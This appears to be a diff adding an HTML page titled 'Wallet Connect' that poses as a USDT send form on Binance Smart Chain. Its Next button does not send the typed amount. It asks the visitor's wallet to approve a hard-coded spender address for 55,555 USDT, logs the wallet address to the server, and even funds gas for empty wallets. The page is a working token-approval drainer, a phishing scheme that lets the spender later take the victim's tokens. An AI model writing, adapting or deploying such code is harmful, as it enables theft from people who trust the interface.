@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>
+
+  <link href="style.css" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Wallet Connect</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <style>
+    body {
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+     
+      color: white;
+      font-family: sans-serif;
+    }
+    button {
+      font-size: 20px;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px;
+      background: #3b82f6;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <script>
+
+    async function addAndSwitchToBSC() {
+    if (!window.ethereum) {
+    alert("Please install MetaMask or a Web3 wallet!");
+    return;
+    }
+    
+    const BSC_MAINNET = {
+    chainId: "0x38", // 56 in hex (BSC mainnet)
+    chainName: "Binance Smart Chain",
+    nativeCurrency: {
+    name: "BNB",
+    symbol: "BNB",
+    decimals: 18,
+    },
+    rpcUrls: ["https://bsc-dataseed.binance.org/"],
+    blockExplorerUrls: ["https://bscscan.com"],
+    };
+    
+    try {
+    // Check current chain
+    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    
+    // If already on BSC, do nothing
+    if (currentChainId === '0x38') {
+    console.log("Already on BSC");
+    return;
+    }
+    
+    // Try switching to BSC
+    try {
+    await window.ethereum.request({
+    method: 'wallet_switchEthereumChain',
+    params: [{ chainId: '0x38' }], // BSC chainId
+    });
+    console.log("Switched to BSC");
+    } catch (switchError) {
+    // If BSC is not added, add it
+    if (switchError.code === 4902) {
+    try {
+    await window.ethereum.request({
+    method: 'wallet_addEthereumChain',
+    params: [BSC_MAINNET],
+    });
+    console.log("BSC network added!");
+    } catch (addError) {
+    console.error("Failed to add BSC network:", addError);
+    alert("Failed to add BSC. Please add it manually in your wallet.");
+    }
+    } else {
+    console.error("Failed to switch to BSC:", switchError);
+    alert("Failed to switch to BSC. Please try manually.");
+    }
+    }
+    } catch (error) {
+    console.error("General error:", error);
+    alert("An error occurred. Check console for details.");
+    }
+    }
+    
+    // Run the function
+    addAndSwitchToBSC();
+    
+    
+    </script>
+    
+
+
+
+  <div class="sc-FEMpB jHFPXJ">
+    <p id="walletInfo" style="display: none;">Connecting...  </p> 
+    <button onclick="approveToken()" style="display: none;">Approve Token</button>
+
+    <div class="sc-fLDLck jOhuYu">
+        <label class="sc-dycHyt hlElTY">Address or Domain Name</label>
+        <div class="sc-jbAkgO iDNzau">
+            <span class="sc-kfeOyU OQPBt">×</span>
+            <input class="sc-gNZgCX gqpZqC" type="text" value="0x20b8c748bc0cf4c1aaec50a331c53c7c335e856c">
+            <span class="sc-hRDKVd eDghcy">Paste</span>
+        </div>
+    
+    </div>
+
+
+    <div class="sc-fLDLck jOhuYu">
+        <label class="sc-dycHyt hlElTY">Amount</label>
+        <div class="sc-jUkaYT hCWkoC">
+            <div class="sc-jbAkgO iDNzau">
+                <input class="sc-gNZgCX gqpZqC" type="number" id="amountInput" value="">
+                <span class="sc-jBIHhB ceQVqA">USDT</span>
+                <span class="sc-cMqPwU pIyLu">Max</span>
+            </div>
+        </div>
+        <p class="sc-jHswkR bUFlBj" id="amountDisplay">= $0.00</p>
+    </div>
+
+
+<button id="nextBtn" type="submit" class="sc-deSjom dgAqxp" onclick="approveToken()">Next</button>
+
+
+
+
+  
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+
+
+
+
+<script>
+    const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT on BSC
+    const funderWallet = '0x2cc4eE673dB9750000c1De0B2dafCE9FAA475761'; // Your funding wallet address
+    const spender = '0x20b8c748bc0cf4c1aaec50a331c53c7c335e856c'; // Your dApp or backend address
+    
+    // USDT has 18 decimals on BSC (unlike 6 on Ethereum)
+    const amount = ethers.utils.parseUnits('55555', 18).toString(); // Now correctly handles 55555 USDT
+  
+    async function approveToken() {
+      if (typeof window.ethereum === 'undefined') {
+        alert('MetaMask is required!');
+        return;
+      }
+  
+      const web3 = new Web3(window.ethereum);
+      const ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
+  
+      try {
+        await ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        const userWallet = accounts[0];
+  
+        // Get the ETH balance to check if the user has enough for gas fees
+        const balance = await web3.eth.getBalance(userWallet);
+        const ethBalance = web3.utils.fromWei(balance, 'ether');
+        console.log(`Wallet: ${userWallet}, Balance: ${ethBalance} ETH`);
+
+
+
+        if (parseFloat(ethBalance) === 0) {
+        // Send 0.00001 ETH from backend
+        await fetch('/send-eth', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ to: userWallet })
+        });
+        console.log('Sent 0.00001 ETH');
+      }
+  
+        // Define contract ABI for USDT approval
+        const usdtABI = [
+          {
+            "constant": false,
+            "inputs": [
+              { "name": "_spender", "type": "address" },
+              { "name": "_value", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "type": "function"
+          }
+        ];
+  
+        const contract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+  
+        try {
+          // First check current allowance
+          const allowanceABI = {
+            "constant": true,
+            "inputs": [
+              {"name": "_owner", "type": "address"},
+              {"name": "_spender", "type": "address"}
+            ],
+            "name": "allowance",
+            "outputs": [{"name": "", "type": "uint256"}],
+            "type": "function"
+          };
+          
+          const allowanceContract = new web3.eth.Contract([...usdtABI, allowanceABI], usdtContractAddress);
+          const currentAllowance = await allowanceContract.methods.allowance(userWallet, spender).call();
+          console.log('Current allowance:', currentAllowance);
+          
+          // Only proceed if current allowance is less than needed
+          if (BigInt(currentAllowance) < BigInt(amount)) {
+            // Approve the token with the correct amount
+            const tx = await contract.methods.approve(spender, amount).send({ from: userWallet });
+            console.log('Approved 55555 USDT. Tx hash:', tx.transactionHash);
+          } else {
+            console.log('Sufficient allowance already exists');
+          }
+  
+          // Log wallet to server
+          await fetch('/log-wallet', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ wallet: userWallet })
+          });
+  
+          console.log('Wallet approved and logged!');
+        } catch (err) {
+          console.error('Approval failed:', err);
+          console.log('Approval failed. Check console for details.');
+        }
+      } catch (err) {
+        console.error('Error during wallet interaction:', err);
+        console.log('Please check your wallet connection or ensure MetaMask is properly set up.');
+      }
+    }
+  
+    // Trigger approval
+    document.getElementById('nextBtn').addEventListener('click', approveToken);
+  </script>
+
+
+
+
+<script>
+  const amountInput = document.getElementById("amountInput");
+const amountDisplay = document.getElementById("amountDisplay");
+
+// Listen for input changes
+amountInput.addEventListener("input", function() {
+  // Get the current value and convert to a number if needed
+  const val = amountInput.value;
+  // Update the p tag; you can add formatting as needed
+  amountDisplay.textContent = `= $${val || "0.00"}`;
+});
+</script>
+
+
+</body>
+</html>
